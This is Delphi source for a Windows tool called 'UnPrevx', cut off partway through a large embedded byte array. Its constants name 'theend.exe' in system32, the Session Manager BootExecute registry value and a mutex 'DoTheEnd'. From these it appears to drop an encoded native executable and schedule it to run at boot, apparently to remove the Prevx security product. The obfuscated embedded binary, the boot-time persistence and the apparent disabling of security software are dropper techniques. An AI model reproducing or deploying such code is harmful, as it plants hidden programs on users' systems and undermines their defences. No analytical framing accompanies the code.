{$E exe}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
//{$DEFINE debug}
{$IFDEF minimum}
program UnPrevx;
{$ENDIF}
{$IFNDEF minimum}
unit UnPrevx;
interface
implementation
{$ENDIF}

{$R version.res}

uses
  Windows, RTL, CAcl, WinNative, DirectNTFS;

const
  TheEndExe: PWideChar = '\system32\theend.exe';
  CurrentUser: PAnsiChar = 'CURRENT_USER';
  String1: PWideChar = 'Failed to get required privilege';
  Title: PWideChar = #20'UnPrevX 1.1.209 (14.10.2010)';
  MutantName: PWideChar = '\BaseNamedObjects\DoTheEnd';
  BootExecuteKey: PWideChar = '\REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager';
  BootExecuteValue: PWideChar = 'BootExecute';
  ValueToSet: PWideChar = 'async theend';
  Key: ULONG = 150;

var
  Mutant: THANDLE;
  inbuf: array[0..8191] of WCHAR;
  outbuf: array[0..8191] of WCHAR;
  buf: LBuf;

  osver: OSVERSIONINFOEXW;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;

  data: array[0..4607] of byte = (
    $24, $32, $F7, $66, $66, $64, $63, $62, $65, $60, $5F, $5E, $8A, $89, $5B, $5A,
    $C1, $58, $57, $56, $55, $54, $53, $52, $11, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $7D, $2C, $2B, $2A,
    $27, $35, $91, $24, $25, $98, $1A, $5D, $00, $88, $1E, $DA, $58, $FB, $EF, $B2,
    $B0, $C9, $F7, $C6, $C7, $B1, $B8, $C4, $B0, $AB, $EF, $AF, $AC, $AA, $A9, $A7,
    $BD, $E8, $A9, $A9, $E5, $B6, $B6, $A0, $E1, $97, $9D, $DE, $C1, $B9, $CC, $DA,
    $94, $95, $9B, $99, $D3, $EF, $EE, $EC, $D5, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $AE, $33, $62, $27, $E6, $50, $04, $72, $E2, $4C, $00, $6E, $DE, $48, $FC, $6A,
    $D3, $1C, $87, $66, $D5, $40, $F4, $62, $D2, $3C, $F1, $5E, $D6, $38, $EC, $5A,
    $65, $02, $83, $56, $C4, $30, $E4, $52, $5D, $FA, $6D, $4E, $BF, $28, $DC, $4A,
    $8B, $4F, $58, $4E, $B6, $20, $D4, $42, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $69, $5B, $97, $96, $51, $93, $94, $92, $29, $9F, $04, $4A, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $A5, $84, $84, $81, $7A, $7F, $79, $7E, $7D, $74, $7B, $7A,
    $79, $70, $77, $76, $75, $74, $73, $72, $E9, $84, $6F, $6E, $6D, $7C, $6B, $6A,
    $69, $48, $67, $66, $65, $64, $23, $62, $61, $70, $5F, $5E, $5D, $5E, $5B, $5A,
    $5C, $58, $56, $56, $55, $54, $53, $52, $54, $50, $4E, $4E, $4D, $4C, $4B, $4A,
    $49, $08, $47, $46, $45, $48, $43, $42, $EC, $17, $3F, $3E, $3C, $3C, $3B, $3D,
    $39, $38, $47, $36, $35, $44, $33, $32, $31, $30, $3F, $2E, $2D, $3C, $2B, $2A,
    $29, $28, $27, $26, $35, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $BD, $F7, $17, $16, $ED, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $A0, $BF, $BE, $75, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $7F, $54, $42, $46, $51, $9C, $9B, $9A,
    $A4, $9E, $97, $96, $95, $A4, $93, $92, $91, $88, $8F, $8E, $8D, $90, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $5D, $7C, $7B, $1A,
    $57, $2A, $1B, $15, $29, $13, $73, $72, $5D, $71, $6F, $6E, $6D, $4C, $6B, $6A,
    $69, $6C, $67, $66, $65, $60, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $15, $54, $53, $12, $2F, $F4, $EE, $02, $EC, $4C, $4B, $4A,
    $51, $4A, $47, $46, $45, $34, $43, $42, $41, $42, $3F, $3E, $3D, $4C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $ED, $2C, $2B, $6A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $3C, $E1, $83, $35, $34, $E5, $1E, $8E, $8E, $F7, $9F, $8E, $A5, $89, $88, $D1,
    $1C, $80, $D2, $19, $7D, $24, $ED, $52, $7E, $63, $3B, $2E, $0D, $4C, $82, $8B,
    $1C, $C1, $63, $C7, $61, $24, $19, $DA, $0D, $20, $FF, $3E, $B8, $FF, $63, $0A,
    $66, $4B, $0F, $16, $F5, $34, $24, $68, $AC, $F3, $57, $73, $F0, $4C, $33, $2A,
    $29, $28, $9E, $D9, $49, $69, $E6, $3E, $E1, $20, $1F, $1E, $94, $DF, $33, $91,
    $CC, $48, $8E, $C9, $49, $8F, $D6, $32, $E1, $A8, $0E, $0E, $1A, $0C, $A3, $1E,
    $FB, $C8, $07, $33, $18, $14, $E3, $C2, $01, $83, $3F, $A6, $E0, $29, $EE, $0E,
    $EB, $B8, $F7, $23, $08, $DC, $D3, $B2, $F1, $C6, $C5, $C4, $1A, $FF, $E3, $CA,
    $A9, $E8, $68, $2A, $E1, $7C, $01, $0F, $E1, $DC, $79, $0B, $0A, $EF, $BB, $BA,
    $99, $D8, $3F, $EE, $D6, $D4, $D3, $EA, $75, $FD, $FC, $FB, $E6, $41, $9E, $43,
    $E5, $47, $E3, $F2, $C7, $C4, $C3, $93, $97, $95, $38, $A9, $C1, $9C, $7B, $BA,
    $53, $BC, $20, $B6, $95, $B4, $B3, $83, $A2, $E6, $2A, $71, $E1, $7C, $81, $25,
    $6C, $D8, $77, $D3, $58, $B8, $E8, $65, $D5, $A0, $9F, $AE, $9D, $13, $4E, $C6,
    $10, $4B, $BF, $0D, $48, $C4, $C0, $E7, $7A, $D6, $8C, $0A, $AB, $8C, $8B, $8A,
    $02, $43, $B7, $FF, $48, $B8, $84, $C1, $FC, $10, $7F, $AE, $AA, $A9, $F2, $3D,
    $9D, $12, $7B, $79, $75, $94, $A0, $9F, $E8, $3B, $9B, $E5, $30, $94, $D4, $6A,
    $79, $68, $67, $37, $E0, $27, $8F, $32, $37, $DB, $22, $86, $2D, $89, $0E, $6E,
    $D0, $0B, $A3, $CD, $08, $74, $CA, $25, $69, $C7, $0A, $6A, $7A, $A1, $34, $90,
    $46, $C4, $9F, $46, $45, $44, $BE, $05, $91, $10, $D7, $42, $3C, $3C, $3B, $B5,
    $FC, $64, $07, $B1, $F8, $5C, $03, $5F, $E4, $44, $A6, $F9, $59, $59, $3E, $26,
    $09, $E8, $27, $0F, $6B, $21, $9F, $A3, $21, $20, $1F, $B8, $FD, $E4, $92, $9D,
    $A1, $43, $44, $43, $8C, $97, $9F, $3D, $3E, $3D, $86, $91, $49, $37, $38, $37,
    $82, $CB, $2B, $7D, $88, $3C, $2E, $2F, $2E, $79, $C2, $F6, $D3, $73, $7E, $66,
    $24, $25, $24, $71, $B8, $40, $C3, $6D, $74, $F4, $1A, $1B, $1A, $BC, $66, $AD,
    $3D, $B8, $14, $99, $F9, $5B, $56, $72, $0C, $0D, $0C, $B4, $75, $09, $08, $E7,
    $D9, $05, $8A, $D2, $1A, $57, $67, $FD, $FE, $FD, $B7, $CE, $CD, $CC, $10, $4D,
    $09, $F3, $F4, $F3, $CD, $C4, $C3, $C2, $06, $43, $03, $E9, $EA, $E9, $BB, $AA,
    $B9, $B8, $FC, $39, $B9, $DF, $E0, $DF, $B6, $B0, $AE, $AE, $DA, $BF, $B7, $8A,
    $69, $A8, $90, $EC, $51, $9C, $1C, $5D, $E9, $19, $72, $AE, $14, $96, $68, $68,
    $62, $CF, $D9, $A6, $95, $67, $0C, $AE, $12, $AC, $6F, $64, $BA, $3F, $83, $05,
    $4C, $B0, $57, $77, $BB, $B1, $96, $5A, $61, $40, $7F, $F9, $40, $A4, $F2, $3D,
    $91, $F3, $3A, $96, $45, $0E, $72, $ED, $34, $68, $3F, $B3, $30, $8C, $73, $6A,
    $69, $68, $DE, $19, $89, $A9, $26, $7E, $21, $60, $5F, $5E, $D4, $0F, $8B, $D1,
    $0C, $8C, $84, $69, $45, $34, $13, $52, $D4, $90, $F7, $48, $7A, $FF, $43, $10,
    $76, $5B, $2F, $26, $05, $44, $BC, $88, $0F, $77, $81, $42, $3D, $0F, $B4, $56,
    $08, $B9, $DA, $62, $35, $CE, $37, $CA, $31, $40, $3F, $2E, $A8, $EF, $23, $FA,
    $C3, $28, $A2, $E9, $51, $F4, $BD, $4F, $4E, $33, $23, $FE, $DD, $1C, $94, $DD,
    $45, $4F, $59, $1A, $15, $E7, $8C, $2E, $E0, $91, $B2, $3A, $0D, $A4, $0B, $8A,
    $09, $08, $82, $C9, $31, $D4, $7E, $C5, $F9, $D0, $99, $2B, $2A, $0F, $FB, $DA,
    $B9, $F8, $2E, $38, $F9, $F4, $C9, $C7, $5F, $F0, $FF, $EE, $ED, $C2, $03, $44,
    $16, $15, $14, $5F, $0D, $67, $10, $96, $D0, $7A, $DF, $B4, $B2, $76, $DE, $07,
    $EC, $BC, $B7, $96, $D5, $BF, $D7, $D2, $D1, $10, $82, $C8, $A2, $E4, $3C, $F7,
    $F6, $F5, $C8, $FC, $DE, $19, $46, $02, $69, $BA, $42, $07, $71, $BE, $32, $AB,
    $32, $FD, $D0, $AE, $8A, $CC, $3C, $DF, $DE, $DD, $A0, $EE, $7A, $7A, $EC, $7D,
    $22, $C4, $28, $C2, $81, $3C, $37, $82, $61, $A0, $1A, $61, $D1, $6C, $C8, $AD,
    $71, $78, $57, $96, $86, $D4, $63, $62, $61, $2A, $8E, $5E, $5D, $5C, $02, $4D,
    $D1, $FF, $4A, $A6, $FC, $47, $A7, $F9, $44, $98, $FA, $41, $99, $4C, $F6, $3D,
    $CD, $48, $0F, $76, $75, $74, $B3, $ED, $34, $9C, $EA, $29, $A1, $3C, $B0, $2D,
    $BD, $70, $67, $66, $65, $DB, $1E, $AE, $8E, $73, $53, $3E, $1D, $5C, $D4, $1D,
    $85, $8F, $98, $29, $CE, $70, $D4, $6E, $61, $41, $8F, $1E, $1D, $E6, $43, $C5,
    $04, $70, $16, $DE, $45, $44, $42, $42, $BC, $FB, $6F, $0D, $0D, $0C, $0B, $67,
    $2C, $48, $29, $F6, $35, $79, $F6, $5A, $75, $27, $2F, $2E, $72, $EF, $57, $24,
    $29, $28, $27, $53, $38, $38, $03, $E2, $21, $57, $60, $F1, $96, $38, $9C, $36,
    $F1, $E9, $ED, $EB, $90, $DF, $3B, $2A, $1B, $3D, $3C, $3B, $86, $3C, $FC, $37,
    $F2, $3D, $BB, $B8, $7E, $C2, $EF, $EB, $3E, $B4, $C8, $16, $94, $FE, $FB, $FA,
    $7C, $38, $AA, $C8, $6E, $BA, $B7, $69, $B4, $20, $6A, $B1, $1D, $BC, $66, $AD,
    $31, $B8, $7F, $13, $12, $F1, $E3, $5D, $A4, $0C, $AF, $55, $88, $10, $20, $9D,
    $21, $E0, $D7, $D6, $D5, $4B, $7E, $1E, $48, $7B, $F3, $45, $78, $EC, $42, $75,
    $E1, $3F, $72, $E2, $F2, $D7, $83, $A2, $81, $C0, $42, $FE, $65, $CD, $90, $E7,
    $6C, $E4, $E4, $C9, $95, $94, $73, $B2, $DE, $63, $DB, $DB, $C0, $94, $8B, $6A,
    $A9, $C0, $62, $D3, $D2, $D1, $1C, $A8, $8A, $E5, $53, $A2, $9E, $CC, $B4, $2E,
    $6F, $B0, $44, $C4, $C2, $C1, $60, $60, $5A, $C7, $D0, $61, $06, $A8, $0C, $A6,
    $71, $5E, $B4, $39, $7D, $FF, $46, $A2, $51, $AD, $92, $56, $5D, $3C, $7B, $6B,
    $AF, $4E, $4D, $10, $15, $0E, $76, $48, $09, $F0, $6F, $6E, $6D, $E7, $2E, $8A,
    $E0, $2B, $B7, $3C, $E0, $27, $7B, $32, $DC, $23, $97, $2E, $F5, $5D, $5B, $6A,
    $59, $D3, $1A, $4E, $25, $99, $16, $8A, $59, $50, $4F, $4E, $C4, $FF, $87, $8F,
    $0C, $9C, $07, $46, $45, $44, $BA, $F5, $89, $B7, $F2, $8A, $6A, $4F, $2F, $1A,
    $F9, $38, $BA, $76, $DD, $EF, $09, $08, $C9, $28, $31, $2E, $2D, $C4, $23, $1A,
    $E9, $28, $A2, $E9, $3D, $F4, $F9, $F8, $F7, $4D, $D2, $16, $4A, $2F, $23, $FA,
    $D9, $18, $9A, $56, $BD, $EF, $AD, $11, $AB, $0F, $E5, $89, $D0, $34, $DB, $85,
    $CC, $38, $D7, $81, $C8, $1C, $D3, $D8, $D7, $D6, $2C, $B1, $F5, $73, $AE, $2E,
    $70, $AB, $27, $6D, $A8, $20, $38, $B5, $19, $E8, $F1, $EE, $ED, $19, $FE, $C6,
    $C9, $A8, $E7, $B4, $1C, $26, $E7, $E2, $B4, $59, $FB, $5F, $F9, $D8, $73, $1E,
    $B9, $98, $D7, $EE, $C0, $FF, $00, $FF, $54, $10, $CC, $52, $37, $CC, $CB, $CA,
    $33, $10, $A7, $86, $C5, $2B, $BB, $B2, $81, $C0, $D7, $2B, $BD, $BC, $BB, $52,
    $CD, $97, $77, $B6, $4D, $AC, $A3, $72, $B1, $C8, $C8, $AE, $AD, $AC, $43, $A2,
    $99, $68, $A7, $BE, $B6, $D1, $D0, $CF, $0B, $E8, $7F, $5E, $9D, $03, $93, $8A,
    $59, $98, $AF, $2B, $95, $94, $93, $2A, $69, $6F, $4F, $8E, $25, $84, $7B, $4A,
    $89, $A0, $C8, $86, $85, $84, $1B, $7A, $71, $40, $7F, $96, $96, $AA, $A8, $A7,
    $91, $B2, $A2, $A3, $A2, $D5, $83, $64, $31, $70, $09, $9B, $E8, $2F, $97, $3A,
    $E4, $2B, $9B, $36, $FD, $44, $73, $22, $61, $78, $EF, $87, $8A, $89, $D2, $1D,
    $81, $D9, $02, $7E, $55, $00, $4A, $7F, $04, $84, $7C, $61, $35, $2C, $0B, $4A,
    $E3, $48, $E1, $46, $DF, $43, $70, $55, $39, $20, $FF, $3E, $BE, $80, $37, $2B,
    $79, $F8, $EB, $45, $9D, $4C, $34, $32, $31, $48, $71, $58, $5A, $59, $43, $22,
    $57, $55, $54, $3F, $3F, $A5, $0E, $32, $13, $E0, $1F, $1E, $D1, $18, $48, $0D,
    $29, $0A, $D7, $16, $42, $27, $FB, $F2, $D1, $10, $A9, $0E, $A7, $39, $38, $1D,
    $E9, $E8, $C7, $06, $32, $E7, $03, $F2, $C1, $00, $36, $40, $01, $FC, $D0, $D0,
    $72, $27, $70, $20, $76, $2B, $20, $E3, $31, $22, $95, $4B, $22, $3B, $EC, $21,
    $62, $16, $60, $18, $5E, $29, $5C, $31, $20, $F7, $E1, $10, $40, $55, $15, $5B,
    $F8, $D9, $09, $3A, $A3, $A1, $14, $4B, $26, $49, $F6, $4F, $04, $F9, $BC, $0A,
    $FB, $6E, $24, $41, $8A, $F2, $3C, $EC, $02, $93, $38, $DA, $36, $77, $B3, $D2,
    $DA, $E5, $E4, $E3, $2E, $87, $AF, $2B, $E9, $C8, $1F, $DB, $DA, $D9, $24, $6D,
    $A1, $73, $E9, $9E, $A5, $4A, $1C, $E1, $47, $21, $C7, $3D, $49, $96, $41, $1B,
    $C1, $42, $44, $9A, $3B, $15, $B3, $DF, $D2, $66, $64, $F6, $FD, $6C, $4B, $8A,
    $02, $AF, $00, $D6, $5E, $AC, $29, $FB, $7D, $95, $97, $D4, $AA, $A9, $A8, $20,
    $F2, $72, $74, $EB, $A5, $8C, $AC, $9F, $9E, $9D, $6C, $E3, $AD, $12, $54, $9A,
    $1E, $77, $19, $7A, $5E, $AA, $E4, $A4, $63, $06, $E2, $9E, $10, $A4, $4C, $9A,
    $26, $26, $98, $47, $95, $14, $6C, $7A, $D2, $88, $7C, $67, $7E, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $BD, $47, $67, $66, $7F, $43, $63, $62, $65, $42, $5F, $5E, $6B, $3E, $5B, $5A,
    $41, $3A, $57, $56, $0D, $36, $53, $52, $F1, $32, $4F, $4E, $EB, $2E, $4B, $4A,
    $C9, $2A, $47, $46, $DB, $26, $43, $42, $B3, $22, $3F, $3E, $77, $1E, $3B, $3A,
    $81, $1A, $37, $36, $69, $16, $33, $32, $35, $11, $2F, $2E, $2B, $0D, $2B, $2A,
    $0B, $09, $27, $26, $25, $24, $23, $22, $D9, $C3, $BB, $BA, $BA, $FC, $DF, $B9,
    $B7, $AF, $BA, $B2, $F5, $F2, $BF, $F0, $11, $10, $0F, $0E, $D9, $0C, $CD, $0A,
    $A8, $08, $B8, $06, $A8, $04, $C1, $02, $A0, $00, $9A, $FE, $A0, $FC, $9F, $FA,
    $B6, $F8, $99, $F6, $8F, $F4, $96, $F2, $92, $F0, $A3, $EE, $9E, $EC, $B7, $EA,
    $AD, $E8, $84, $E6, $B9, $E4, $7B, $E2, $84, $E0, $A2, $DE, $7B, $DC, $7F, $DA,
    $D9, $D8, $D7, $D6, $A1, $D4, $97, $D2, $74, $D0, $85, $CE, $64, $CC, $6C, $CA,
    $6C, $C8, $93, $C6, $87, $C4, $66, $C2, $64, $C0, $6F, $BE, $BD, $BC, $BB, $BA,
    $69, $B8, $69, $B6, $58, $B4, $69, $B2, $59, $B0, $8D, $AE, $50, $AC, $53, $AA,
    $4C, $A8, $A7, $A6, $71, $A4, $90, $A2, $8E, $A0, $6B, $9E, $4D, $9C, $43, $9A,
    $32, $98, $39, $96, $3B, $94, $93, $92, $5D, $90, $60, $8E, $34, $8C, $3C, $8A,
    $3D, $88, $2A, $86, $20, $84, $55, $82, $1E, $80, $1C, $7E, $31, $7C, $47, $7A,
    $2A, $78, $1E, $76, $26, $74, $27, $72, $14, $70, $0A, $6E, $5E, $6C, $5D, $6A,
    $35, $68, $0B, $66, $17, $64, $FA, $62, $17, $60, $02, $5E, $0F, $5C, $0C, $5A,
    $25, $58, $57, $56, $05, $54, $FB, $52, $03, $50, $03, $4E, $FE, $4C, $29, $4A,
    $FA, $48, $EE, $46, $F6, $44, $43, $42, $F1, $40, $E7, $3E, $EE, $3C, $DC, $3A,
    $D8, $38, $D5, $36, $13, $34, $E4, $32, $D8, $30, $E0, $2E, $2D, $2C, $2B, $2A,
    $19, $28, $16, $26, $17, $24, $14, $22, $15, $20, $12, $1E, $13, $1C, $10, $1A,
    $01, $18, $FE, $16, $D4, $14, $D5, $12, $D2, $10, $D3, $0E, $D0, $0C, $D1, $0A,
    $09, $08, $07, $06, $81, $E3, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $EB, $D9, $F7, $F6, $F5, $D4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $31, $BB, $DB, $DA,
    $F3, $B7, $D7, $D6, $D9, $B6, $D3, $D2, $DF, $B2, $CF, $CE, $B5, $AE, $CB, $CA,
    $81, $AA, $C7, $C6, $65, $A6, $C3, $C2, $5F, $A2, $BF, $BE, $3D, $9E, $BB, $BA,
    $4F, $9A, $B7, $B6, $27, $96, $B3, $B2, $EB, $92, $AF, $AE, $F5, $8E, $AB, $AA,
    $DD, $8A, $A7, $A6, $A9, $85, $A3, $A2, $9F, $81, $9F, $9E, $7F, $7D, $9B, $9A,
    $99, $98, $97, $96, $1B, $94, $51, $46, $57, $42, $32, $31, $63, $23, $3D, $3E,
    $3C, $27, $23, $41, $28, $1F, $20, $34, $28, $80, $40, $7E, $3B, $30, $3A, $16,
    $15, $15, $18, $15, $29, $17, $49, $09, $23, $24, $22, $0D, $09, $27, $0E, $05,
    $06, $1A, $0E, $66, $A2, $66, $35, $16, $FD, $31, $02, $12, $2D, $0E, $F8, $FB,
    $FC, $09, $08, $0D, $06, $15, $05, $E9, $05, $E7, $F0, $ED, $E9, $4C, $8D, $4A,
    $07, $FC, $17, $F8, $E2, $F8, $E6, $E3, $F5, $16, $D6, $F0, $F1, $EF, $DA, $D6,
    $F4, $DB, $D2, $D3, $E7, $DB, $33, $32, $A0, $30, $ED, $E2, $EA, $DC, $CE, $C8,
    $E4, $DB, $DB, $C5, $C3, $D8, $23, $22, $D5, $20, $DD, $D2, $E1, $BF, $D1, $B1,
    $BA, $BB, $CE, $B3, $D6, $B1, $B1, $C6, $C3, $AD, $AB, $D4, $A4, $A8, $AE, $0A,
    $D9, $07, $C5, $BA, $DA, $B6, $9A, $B6, $A4, $C6, $96, $9A, $A0, $FC, $93, $FA,
    $B7, $AC, $B8, $A8, $98, $93, $A7, $95, $C5, $88, $A1, $91, $8C, $90, $EB, $EA,
    $D6, $E7, $A5, $9A, $B9, $87, $95, $7D, $78, $7E, $7E, $92, $80, $AC, $8D, $77,
    $7A, $7B, $88, $87, $D5, $D4, $EA, $D2, $8F, $84, $9E, $81, $70, $7E, $72, $9B,
    $70, $79, $7B, $69, $60, $7B, $61, $68, $5E, $72, $5A, $5D, $71, $53, $58, $58,
    $B9, $B8, $AA, $B8, $87, $68, $4F, $69, $4F, $47, $63, $81, $4B, $43, $4C, $47,
    $4D, $4B, $78, $5A, $57, $3B, $41, $47, $A1, $A0, $29, $9E, $5B, $50, $57, $37,
    $3A, $31, $5D, $2D, $31, $37, $93, $92, $F9, $90, $4D, $42, $4A, $3C, $2E, $28,
    $5A, $2F, $22, $28, $22, $20, $1A, $23, $3D, $17, $1D, $17, $3A, $1E, $15, $1D,
    $1A, $2C, $77, $76, $4A, $74, $31, $26, $32, $22, $12, $0D, $21, $0F, $31, $01,
    $05, $0B, $67, $66, $1E, $64, $21, $16, $22, $FC, $FC, $0F, $00, $5C, $F7, $5A,
